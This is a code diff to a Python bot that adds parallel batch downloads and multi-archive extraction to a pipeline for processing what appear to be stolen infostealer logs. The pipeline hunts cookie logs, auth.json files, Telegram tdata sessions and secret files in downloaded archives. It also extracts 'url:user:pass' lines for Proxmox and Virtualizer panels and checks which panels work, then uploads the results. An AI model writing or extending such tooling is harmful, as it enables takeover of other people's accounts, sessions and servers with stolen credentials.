@@ -150,6 +150,14 @@ def stage_panel(p: dict) -> str:
         lines.append(f"📁 {code(got)} / {code(tot)}   ⚡ {code(p.get('speed', '-'))}   ⏱ {code(elapsed)}")
         if p.get("file"):
             lines.append(f"🏷 {code(p['file'])} ({code(fmt_size(p.get('size')))})")
+        # A batch job downloads many files at once: the card must show the
+        # whole picture (how many files are loaded, and the total size).
+        if p.get("files_total"):
+            fd = p.get("files_done", 0)
+            lines.append(f"📂 {code('%d/%d files loaded' % (fd, p['files_total']))}"
+                         f"   💾 {code(p.get('total_gb') or '-')} total")
+            if p.get("active") and fd < p["files_total"]:
+                lines.append(f"⬇️ {code(p['active'])}")
 
     if stage in ("extract", "extracted", "wrong_password") and p.get("files_total"):
         files = f"{p.get('files', 0)}/{p.get('files_total')}"
@@ -622,6 +630,194 @@ def download(url):
        dl_time=ft(time.time() - t0))
     return Path(found)
 
+
+# ── parallel batch download ──
+BATCH_DOWNLOAD_THREADS = 5   # files fetched at the same time
+
+
+def _dl_one(url, idx, total, state, results, lock):
+    """Fetch one file of a batch. The per-file progress is folded into the
+    shared card state so the UI shows one combined number for the whole
+    batch instead of whichever file happened to report last."""
+    name = Path(url.split("?")[0]).name or ("file%d" % (idx + 1))
+    try:
+        src, fname, fsize, err = resolve(url)
+        if err:
+            with lock:
+                state["errors"].append("%s: %s" % (name, err))
+            return
+        if fname:
+            name = fname
+        with lock:
+            state["names"][idx] = name
+            state["total_bytes"] += fsize
+        if src != url:
+            url = src
+
+        dest = WORK / "dl_batch"
+        dest.mkdir(parents=True, exist_ok=True)
+        # Each file gets its own name so two uploads with the same name do
+        # not overwrite each other.
+        out_name = name
+        if dest.exists() and (dest / out_name).exists():
+            stem, ext = os.path.splitext(out_name)
+            out_name = "%s_%d%s" % (stem, idx, ext)
+        got = [0]
+        t0 = time.time()
+
+        def worker_fetch(start, end):
+            import urllib.request
+            curr = start
+            retries = 3
+            while curr <= end and retries > 0:
+                if stop(): return
+                try:
+                    req = urllib.request.Request(url, headers={
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                        "Range": "bytes=%d-%d" % (curr, end),
+                        "Accept": "*/*",
+                    })
+                    with urllib.request.urlopen(req, timeout=45) as r:
+                        while curr <= end:
+                            if stop(): return
+                            chunk = r.read(1024 * 1024)
+                            if not chunk: break
+                            with lock:
+                                pass
+                            curr += len(chunk)
+                            got[0] += len(chunk)
+                            with lock:
+                                state["done_bytes"] += len(chunk)
+                                state["active"] = name
+                except Exception:
+                    retries -= 1
+                    time.sleep(1)
+
+        total_size = fsize or 0
+        if total_size <= 0:
+            try:
+                req = urllib.request.Request(url, headers={
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                    "Range": "bytes=0-0",
+                })
+                with urllib.request.urlopen(req, timeout=20) as r:
+                    cr = r.headers.get("Content-Range")
+                    if cr and "/" in cr:
+                        total_size = int(cr.split("/")[-1])
+                    else:
+                        total_size = int(r.headers.get("Content-Length") or 0)
+            except Exception:
+                total_size = 0
+
+        tgt = dest / out_name
+        fd = os.open(str(tgt), os.O_RDWR | os.O_CREAT | os.O_TRUNC)
+        try:
+            if total_size > 0:
+                try: os.posix_fallocate(fd, 0, total_size)
+                except Exception:
+                    try: os.ftruncate(fd, total_size)
+                    except Exception: pass
+                workers = 4 if ("/dl/" in url) else min(16, max(4, (os.cpu_count() or 4) * 2))
+                chunk = total_size // workers
+                with ThreadPoolExecutor(max_workers=workers) as ex:
+                    futs = []
+                    for i in range(workers):
+                        s0 = i * chunk
+                        e0 = total_size - 1 if i == workers - 1 else (i + 1) * chunk - 1
+                        futs.append(ex.submit(worker_fetch, s0, e0))
+                    for f in as_completed(futs):
+                        f.result()
+            else:
+                # Size unknown — plain streaming pull.
+                import urllib.request
+                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                with urllib.request.urlopen(req, timeout=900) as r:
+                    while True:
+                        if stop(): break
+                        chunk = r.read(2 * 1024 * 1024)
+                        if not chunk: break
+                        os.write(fd, chunk)
+                        got[0] += len(chunk)
+                        with lock:
+                            state["done_bytes"] += len(chunk)
+                            state["active"] = name
+        finally:
+            os.close(fd)
+
+        if not os.path.isfile(str(tgt)) or os.path.getsize(str(tgt)) == 0:
+            with lock:
+                state["errors"].append("%s: download produced no data" % name)
+            return
+
+        with lock:
+            state["done_files"] += 1
+            results[idx] = str(tgt)
+        sys.stdout.write("batch dl %d/%d ok: %s (%s)\n"
+                         % (state["done_files"], total, name, fs(os.path.getsize(str(tgt)))))
+        sys.stdout.flush()
+    except Exception as e:
+        with lock:
+            state["errors"].append("%s: %s" % (name, e))
+
+
+def download_batch(urls):
+    """Fetch every file of a batch in parallel and return the local paths.
+
+    Files land in their own directory so two uploads with the same name do
+    not collide. The card shows the combined progress: total bytes so far,
+    total bytes expected, and how many files are loaded."""
+    urls = [u for u in urls if u]
+    if not urls:
+        return [], "no files to download"
+
+    state = {"done_bytes": 0, "total_bytes": 0, "done_files": 0,
+             "active": "", "names": [""] * len(urls), "errors": []}
+    results = [None] * len(urls)
+    lock = threading.Lock()
+
+    st("download", 2, engine="parallel batch (%d threads)" % BATCH_DOWNLOAD_THREADS,
+       files_total=len(urls), files_done=0, got=fs(0), total="?")
+
+    t0 = time.time()
+    with ThreadPoolExecutor(max_workers=BATCH_DOWNLOAD_THREADS) as ex:
+        futs = [ex.submit(_dl_one, u, i, len(urls), state, results, lock)
+                for i, u in enumerate(urls)]
+        # The card is refreshed from here so the batch progress stays live
+        # while the downloads run.
+        for f in as_completed(futs):
+            f.result()
+            with lock:
+                done_b = state["done_bytes"]
+                tot_b = state["total_bytes"]
+                dn = state["done_files"]
+                active = state["active"]
+            pct = 4 + int(done_b * 26 // tot_b) if tot_b else 4
+            if pct > 30: pct = 30
+            el = time.time() - t0
+            spd = fs(done_b / el) + "/s" if el > 0 else "-"
+            tick("download", pct, got=fs(done_b),
+                 total=fs(tot_b) if tot_b else "?",
+                 speed=spd, elapsed=ft(el), file=active,
+                 files_done=dn, files_total=len(urls),
+                 total_gb=fs(tot_b) if tot_b else "?")
+
+    with lock:
+        errors = list(state["errors"])
+        done_files = state["done_files"]
+        total_b = state["total_bytes"]
+    paths = [p for p in results if p]
+    if not paths:
+        return [], (errors[0] if errors else "every download failed")
+    st("downloaded", 30, file="%d/%d files" % (done_files, len(urls)),
+       size=fs(total_b), files_done=done_files, files_total=len(urls),
+       total_gb=fs(total_b) if total_b else "?",
+       dl_time=ft(time.time() - t0))
+    if errors:
+        sys.stdout.write("batch dl warnings: %s\n" % "; ".join(errors[:5]))
+        sys.stdout.flush()
+    return paths, None
+
+
 def fast_parallel_dl(url, dest, fname=None, fsize=0, t0=None):
     """High-throughput multi-connection parallel segment downloader using atomic
     posix_fallocate + direct os.pwrite without seeking or locking races."""
@@ -879,6 +1075,30 @@ def _extract(arc, out, pwds, filters):
     return False, ("wrong_password" if badpwd else "corrupt")
 
 # ── 3. cookie search on every core + packaging ──
+def _extract_all(arcs, out, pwds, filters, label):
+    """Run an extraction pass over every archive of the batch.
+
+    A single-archive job behaves exactly as before: one _extract call. A
+    batch runs the pass once per archive into the same output folder, so
+    the second archive can add files the first one did not have."""
+    if not arcs:
+        return False, "no_source"
+    ok_any, why_any = False, "corrupt"
+    for a in arcs:
+        try:
+            ok, why = _extract(a, out, pwds, filters)
+        except Exception as e:
+            sys.stdout.write("%s pass: %s\n" % (label, e))
+            sys.stdout.flush()
+            continue
+        if ok:
+            ok_any = True
+            why_any = "ok"
+        elif why != "wrong_password":
+            why_any = why
+    return ok_any, why_any
+
+
 def search_pack(ex, want_auth=True):
     """One tree walk collects both scan targets: cookie logs and auth.json."""
     files, auths = [], []
@@ -2021,6 +2241,11 @@ def finish(task, stage, **extra):
                         f"⏱ <b>Elapsed:</b> <code>{tot_elapsed}</code>",
                         f"🖥 <b>Runner:</b> <code>github-runner</code>",
                     ]
+                    if extra.get("files_total"):
+                        lines.insert(2, f"📂 <b>Files:</b> <code>{extra.get('files_done', 0)}"
+                                        f"/{extra['files_total']}</code>")
+                    if extra.get("total_gb"):
+                        lines.insert(3, f"💾 <b>Total size:</b> <code>{extra['total_gb']}</code>")
                 else:
                     cookies_cnt = extra.get("cookies", 0)
                     sent_cnt = len(extra.get("sent") or [])
@@ -2073,6 +2298,7 @@ def finish(task, stage, **extra):
                              "ck_total", "ck_live", "ck_prem", "ck_free",
                              "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies",
                              "total", "reach", "invalid", "unreach",
+                             "files_done", "files_total", "total_gb",
                              "valid", "bad", "errors")})
     payload["pubs"] = PB[3]
     report(payload)
@@ -2528,6 +2754,50 @@ def tg_pull(fid, path):
 def _vps_pct(done, total, base=2, span=96):
     return base + (done * span // total if total else 0)
 
+
+def _batch_total_gb(task):
+    """Total size of the batch, as the card shows it."""
+    total = _state.get("total_bytes") or 0
+    if not total:
+        try:
+            for p in (WORK / "dl_batch").glob("*"):
+                if p.is_file():
+                    total += p.stat().st_size
+        except Exception:
+            pass
+    return fs(total) if total else None
+
+
+def _batch_sources(task):
+    """Every local file this job must scan.
+
+    A batch job carries "urls" (the whole pile the user uploaded); a single
+    job carries "url". Both end up here so the scan code below does not care
+    which shape it got."""
+    urls = task.get("urls") or []
+    if not urls and task.get("url"):
+        urls = [task["url"]]
+
+    paths = []
+    if urls:
+        if len(urls) == 1:
+            arc = download(urls[0])
+            if arc is not None:
+                paths = [str(arc)]
+        else:
+            got, err = download_batch(urls)
+            if err:
+                _state["err"] = err
+            paths = got
+        if paths:
+            return paths
+
+    if task.get("file_id"):
+        name = "vps_src.dat" if task.get("kind") == "vps_promox" else "virtl_src.dat"
+        return [tg_pull(task["file_id"], str(WORK / name))]
+
+    return paths
+
 def process_vps(task):
     """/vps_promox and /vps_check on this runner — one clean VM per job."""
     global CHAT
@@ -2540,18 +2810,19 @@ def process_vps(task):
     t0 = time.time()
 
     if kind == "vps_promox":
-        if task.get("url"):
-            arc = download(task["url"])            # /extract's own downloader
-            if arc is None:
-                finish(task, "error", err=_state.get("err") or "download failed")
-                return
-            path = str(arc)
-        elif task.get("file_id"):
-            path = tg_pull(task["file_id"], str(WORK / "vps_src.dat"))
-        else:
-            finish(task, "error", err="no source — send an ulp link or a file"); return
-        st("scan", 96, msg="filtering the panel lines (streamed)…", file=Path(path).name)
-        hits = vps_hits(path)
+        paths = _batch_sources(task)
+        if not paths:
+            finish(task, "error", err=_state.get("err") or "no source — send an ulp link or a file"); return
+        st("scan", 96, msg="filtering the panel lines (streamed)…",
+           file="%d file(s)" % len(paths))
+        hits = []
+        seen = set()
+        for p in paths:
+            for h in vps_hits(p):
+                if h in seen:
+                    continue
+                seen.add(h)
+                hits.append(h)
         if not hits:
             finish(task, "error", err="no panel url:user:pass lines in the source")
             return
@@ -2598,7 +2869,8 @@ def process_vps(task):
         sent2 = upload(wf, "✅ VPS PROMOX — %s working panels" % len(ok)) if wf else 0
         finish(task, "done", total=len(hits), reach=len(ok),
                invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
-               working=len(ok))
+               working=len(ok), files_done=len(paths), files_total=len(paths),
+               total_gb=_batch_total_gb(task))
         return
 
     if kind == "vps_check":
@@ -2650,18 +2922,19 @@ def process_vps(task):
         return
 
     if kind == "vps_virtl":
-        if task.get("url"):
-            arc = download(task["url"])
-            if arc is None:
-                finish(task, "error", err=_state.get("err") or "download failed")
-                return
-            path = str(arc)
-        elif task.get("file_id"):
-            path = tg_pull(task["file_id"], str(WORK / "virtl_src.dat"))
-        else:
-            finish(task, "error", err="no source — send an ulp link or a file"); return
-        st("scan", 96, msg="filtering the virtualizer lines (streamed)…", file=Path(path).name)
-        hits = virtl_hits(path)
+        paths = _batch_sources(task)
+        if not paths:
+            finish(task, "error", err=_state.get("err") or "no source — send an ulp link or a file"); return
+        st("scan", 96, msg="filtering the virtualizer lines (streamed)…",
+           file="%d file(s)" % len(paths))
+        hits = []
+        seen = set()
+        for p in paths:
+            for h in virtl_hits(p):
+                if h in seen:
+                    continue
+                seen.add(h)
+                hits.append(h)
         if not hits:
             finish(task, "error", err="no virtualizer url:user:pass lines in the source")
             return
@@ -2708,7 +2981,8 @@ def process_vps(task):
         sent2 = upload(wf, "✅ VPS VIRTUALIZER — %s working panels" % len(ok)) if wf else 0
         finish(task, "done", total=len(hits), reach=len(ok),
                invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
-               working=len(ok))
+               working=len(ok), files_done=len(paths), files_total=len(paths),
+               total_gb=_batch_total_gb(task))
         return
 
     if kind == "vps_verify":
@@ -2767,7 +3041,7 @@ def process_vps(task):
         sent2 = upload(wf, "✅ VPS VIRTUALIZER — %s working panels" % len(valid)) if wf else 0
         finish(task, "done", total=len(entries), valid=len(valid),
                bad=len(bad), errors=len(errl), sent=1 if sent else 0,
-               working=len(valid))
+               working=len(valid), files_done=1, files_total=1)
         return
 
     finish(task, "error", err="unknown vps kind %r" % kind)
@@ -2784,24 +3058,73 @@ def process(task):
         except Exception: pass
     (OUT / "cancel.flag").unlink(missing_ok=True)
     st("queued", 0, job=task.get("job"), vm=SPECS)
-    arc = download(task["url"])
-    if arc is None:
-        why = _state.get("err") or "aborted"
+    urls = task.get("urls") or ([task["url"]] if task.get("url") else [])
+    if not urls:
+        finish(task, "error", err="no source — send an archive link")
+        return
+    if len(urls) == 1:
+        arc = download(urls[0])
+        if arc is None:
+            why = _state.get("err") or "aborted"
+            if stop():
+                finish(task, "cancelled", err="cancelled")
+            else:
+                finish(task, "error", err=why)
+            return
+        arcs = [str(arc)]
+    else:
+        arcs, err = download_batch(urls)
+        if err and not arcs:
+            if stop():
+                finish(task, "cancelled", err="cancelled")
+            else:
+                finish(task, "error", err=err)
+            return
+    # Every archive of the batch is extracted, then the trees are merged into
+    # WORK/ex so the scan, the auth pack and the tdata passes below keep
+    # working on a single root.
+    ex_root = WORK / "ex"
+    if len(arcs) == 1:
+        ok, why = extract(arcs[0], ex_root, task.get("passwords") or [])
         if stop():
-            finish(task, "cancelled", err="cancelled")
-        else:
-            finish(task, "error", err=why)
-        return
-    ok, why = extract(arc, WORK / "ex", task.get("passwords") or [])
-    if stop():
-        finish(task, "cancelled", err="cancelled"); return
-    if not ok:
-        tried = len(task.get("passwords") or [])
-        if why == "wrong_password":
-            finish(task, "wrong_password", tried=tried)
-        else:
-            finish(task, "error", err=why)
-        return
+            finish(task, "cancelled", err="cancelled"); return
+        if not ok:
+            tried = len(task.get("passwords") or [])
+            if why == "wrong_password":
+                finish(task, "wrong_password", tried=tried)
+            else:
+                finish(task, "error", err=why)
+            return
+    else:
+        for i, a in enumerate(arcs):
+            if stop():
+                finish(task, "cancelled", err="cancelled"); return
+            part_dir = WORK / ("ex_part%d" % i)
+            ok, why = extract(a, part_dir, task.get("passwords") or [])
+            if stop():
+                finish(task, "cancelled", err="cancelled"); return
+            if not ok:
+                tried = len(task.get("passwords") or [])
+                if why == "wrong_password":
+                    finish(task, "wrong_password", tried=tried)
+                else:
+                    finish(task, "error", err=why)
+                return
+            # Merge this tree into the shared root. A name that already
+            # exists is kept under a suffixed name so nothing is lost.
+            ex_root.mkdir(parents=True, exist_ok=True)
+            for item in list(part_dir.iterdir()):
+                tgt = ex_root / item.name
+                if tgt.exists():
+                    stem, ext = os.path.splitext(item.name)
+                    tgt = ex_root / ("%s_%d%s" % (stem, i, ext))
+                try:
+                    shutil.move(str(item), str(tgt))
+                except Exception:
+                    pass
+            shutil.rmtree(part_dir, ignore_errors=True)
+    arc = arcs[0]
+    ok, why = True, "ok"
     # keep dl/ for the whole run: the json / secrets / tdata passes all need
     # the archive on disk, WORK is wiped at the end anyway.
     packed, auths = search_pack(WORK / "ex", bool(task.get("auth")))
@@ -2818,18 +3141,13 @@ def process(task):
         if not tdirs:
             # the filtered extract skips tdata binaries — pull them now
             st("extract", 45, msg="tdata not in filtered extract — pulling")
-            try:
-                _extract(arc, WORK / "tdex", task.get("passwords") or [],
-                         ["*tdata*"])
-            except Exception as e:
-                sys.stdout.write("tdex pass: %s\n" % e); sys.stdout.flush()
+            _extract_all(arcs, WORK / "tdex", task.get("passwords") or [],
+                         ["*tdata*"], "tdex")
             tdirs = find_tdata(WORK / "ex") + find_tdata(WORK / "tdex")
         if not tdirs:
             st("extract", 45, msg="full extract to hunt tdata folders")
-            try:
-                _extract(arc, WORK / "tdfull", task.get("passwords") or [], None)
-            except Exception as e:
-                sys.stdout.write("tdfull pass: %s\n" % e); sys.stdout.flush()
+            _extract_all(arcs, WORK / "tdfull", task.get("passwords") or [], None,
+                         "tdfull")
             tdirs = find_tdata(WORK / "tdfull")
         if not tdirs:
             tdirs = find_tdata(WORK / "ex")   # final sweep, signature rules too
@@ -2899,24 +3217,13 @@ def process(task):
             # pull all the other .json files now; on nested archives the
             # include-mask pass often matches nothing, so a full pass follows
             st("extract", 45, msg="pulling every .json from the archive")
-            ok, why = False, "pass_skipped"
-            try:
-                ok, why = _extract(arc, WORK / "jx",
-                                   task.get("passwords") or [], ["*.json"])
-                sys.stdout.write("jx incl pass: ok=%s why=%s\n" % (ok, why))
-            except Exception as e:
-                sys.stdout.write("jx incl pass: %s\n" % e)
-            sys.stdout.flush()
+            _extract_all(arcs, WORK / "jx", task.get("passwords") or [],
+                         ["*.json"], "jx incl")
             jsf = find_json([WORK / "jx"])
             if not jsf:
                 st("extract", 45, msg="full extract to gather every .json")
-                try:
-                    ok, why = _extract(arc, WORK / "jx",
-                                       task.get("passwords") or [], None)
-                    sys.stdout.write("jx full pass: ok=%s why=%s\n" % (ok, why))
-                except Exception as e:
-                    sys.stdout.write("jx full pass: %s\n" % e)
-                sys.stdout.flush()
+                _extract_all(arcs, WORK / "jx", task.get("passwords") or [],
+                             None, "jx full")
                 jsf = find_json([WORK / "jx"])
             sys.stdout.write("json hunt total: %d files\n" % len(jsf))
             sys.stdout.flush()
@@ -2937,20 +3244,13 @@ def process(task):
     secf = find_secrets([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
     if not secf:
         st("extract", 45, msg="pulling secret files from the archive")
-        try:
-            _extract(arc, WORK / "sx", task.get("passwords") or [],
-                     SECRET_FILTERS)
-        except Exception as e:
-            sys.stdout.write("sx pass: %s\n" % e)
-        sys.stdout.flush()
+        _extract_all(arcs, WORK / "sx", task.get("passwords") or [],
+                     SECRET_FILTERS, "sx")
         secf = find_secrets([WORK / "sx"])
         if not secf:
             st("extract", 45, msg="full extract to hunt every secret file")
-            try:
-                _extract(arc, WORK / "sx", task.get("passwords") or [], None)
-            except Exception as e:
-                sys.stdout.write("sx full pass: %s\n" % e)
-            sys.stdout.flush()
+            _extract_all(arcs, WORK / "sx", task.get("passwords") or [], None,
+                         "sx full")
             secf = find_secrets([WORK / "sx"])
     sys.stdout.write("secret hunt: %d files\n" % len(secf)); sys.stdout.flush()
     sec_zip, sec_total = pack_secrets(secf)
